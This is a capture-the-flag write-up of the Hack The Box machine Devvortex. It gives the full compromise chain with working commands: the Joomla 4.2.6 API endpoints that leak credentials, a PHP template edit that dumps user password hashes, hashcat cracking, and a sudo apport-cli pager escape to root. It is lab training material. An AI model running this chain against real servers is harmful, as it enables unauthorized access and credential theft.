# HTB - Devvortex

## Machine Information

| Category | Value |
|----------|-------|
| Platform | Hack The Box |
| Machine | Devvortex |
| OS | Linux |
| Difficulty | Easy |

---

# Attack Path

```text
Recon
    │
    ▼
Nmap Scan
    │
    ▼
Virtual Host Enumeration
    │
    ▼
dev.devvortex.htb
    │
    ▼
Directory Enumeration
    │
    ▼
Joomla Discovery
    │
    ▼
Version Enumeration (4.2.6)
    │
    ▼
API Information Disclosure
    │
    ▼
Leaked Admin Credentials
    │
    ▼
Joomla Administrator Access
    │
    ▼
Database Enumeration
    │
    ▼
Extract User Password Hash
    │
    ▼
Hash Cracking
    │
    ▼
SSH Access (logan)
    │
    ▼
Sudo Enumeration
    │
    ▼
Apport-cli Privilege Escalation
    │
    ▼
Root
```

---

# Reconnaissance

## Nmap

```bash
nmap -sV -sC 10.129.x.x
```

### Results

```
22/tcp open  ssh   OpenSSH 8.2p1
80/tcp open  http  nginx 1.18.0
```

The HTTP service redirected to:

```
http://devvortex.htb
```

After adding the domain to `/etc/hosts`:

```bash
echo "10.129.x.x devvortex.htb" | sudo tee -a /etc/hosts
```

---

# Virtual Host Enumeration

Using Gobuster to enumerate virtual hosts:

```bash
gobuster vhost \
-u http://devvortex.htb \
-w /path/to/common_wordlist
```

Discovered virtual host:

```
dev.devvortex.htb
```

---

# Directory Enumeration

Enumerated directories on the development virtual host.

```bash
gobuster dir \
-u http://dev.devvortex.htb \
-w /usr/share/wordlists/dirb/common.txt \
-t 100 \
-q \
-xl 9265
```

Interesting discovery:

```
robots.txt
```

Contents:

```
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

The `/administrator/` endpoint exposed a Joomla administrator login page.

---

# Joomla Enumeration

The Joomla version was identified through:

```
/administrator/manifests/files/joomla.xml
```

Version:

```
4.2.6
```

This version is vulnerable to an information disclosure vulnerability.

---

# Information Disclosure

Enumerating the Joomla API revealed user information.

```
http://dev.devvortex.htb/api/v1/users?public=true
```

Returned users:

- lewis
- logan

Another API endpoint exposed application configuration.

```
http://dev.devvortex.htb/api/v1/config/application?public=true
```

Leaked credentials:

```
Username: lewis
Password: P4ntherg0t1n5r3c0n##
```

---

# Administrator Access

Logged into the Joomla administrator panel using the leaked credentials.

Inside the global configuration page:

```
/administrator/index.php?option=com_config
```

The database table prefix was identified as:

```
sd4fg_
```

Knowing the table prefix allows direct SQL queries against the Joomla database.

---

# Database Enumeration

The administrator template was modified:

```
/administrator/templates/atum/index.php
```

The following PHP code was added to query the users table:

```php
$db = \Joomla\CMS\Factory::getDbo();

$query = $db->getQuery(true);

$query->select($db->quoteName(array(
    'id',
    'username',
    'email',
    'password'
)));

$query->from($db->quoteName('sd4fg_users'));

$db->setQuery($query);

try {
    $results = $db->loadObjectList();

    if (!empty($results)) {
        echo "<pre>";
        print_r($results);
        echo "</pre>";
    } else {
        echo "No data found.";
    }
} catch (Exception $e) {
    echo "Database error: " . $e->getMessage();
}
```

Refreshing the page displayed the contents of the users table.

Recovered password hash for **logan**:

```
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

---

# Password Cracking

Save the hash:

```bash
echo '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' > hash.txt
```

Crack it with Hashcat:

```bash
hashcat -m 3200 hash.txt rockyou.txt
```

Recovered password:

```
tequieromucho
```

---

# Initial Access

SSH login:

```bash
ssh logan@10.129.x.x
```

Successfully authenticated using:

```
logan : tequieromucho
```

User flag:

```
/home/logan/Desktop/user.txt
```

---

# Privilege Escalation

Checking sudo permissions:

```bash
sudo -l
```

Output:

```text
User logan may run the following commands:

(ALL : ALL) /usr/bin/apport-cli
```

Since `apport-cli` can inspect crash reports, a fake crash file was created.

```bash
echo -e "ProblemType: Bug\nPackage: coreutils" > test.crash
```

Run:

```bash
sudo /usr/bin/apport-cli test.crash
```

When prompted:

```
V
```

This opens the report inside a pager.

Escape to a root shell:

```bash
!bash
```

or execute commands directly:

```bash
!cat /root/root.txt
```

Root access obtained.

---

# Flags

## User

```
/home/logan/Desktop/user.txt
```

## Root

```
/root/root.txt
```

---

# Lessons Learned

- Enumerating virtual hosts can expose completely different applications.
- `robots.txt` often reveals valuable attack surface.
- CMS version fingerprinting is essential before searching for exploits.
- Public API endpoints may leak sensitive configuration and credentials.
- Administrator access does not always require uploading a web shell; existing functionality may be sufficient to interact with the backend.
- Always enumerate database configuration after obtaining administrative access.
- Password reuse across services remains common.
- Never overlook `sudo -l`; seemingly harmless binaries such as `apport-cli` can provide a straightforward path to privilege escalation.

---

# Tools Used

- Nmap
- Gobuster
- Joomla API
- Hashcat
- SSH
- apport-cli

---

# MITRE ATT&CK Mapping

| Phase | Technique |
|--------|-----------|
| Active Scanning | T1595 |
| Gather Victim Host Information | T1592 |
| Exploit Public-Facing Application | T1190 |
| Valid Accounts | T1078 |
| Credential Access | T1003 |
| Command and Scripting Interpreter | T1059 |
| Abuse Elevation Control Mechanism | T1548 |
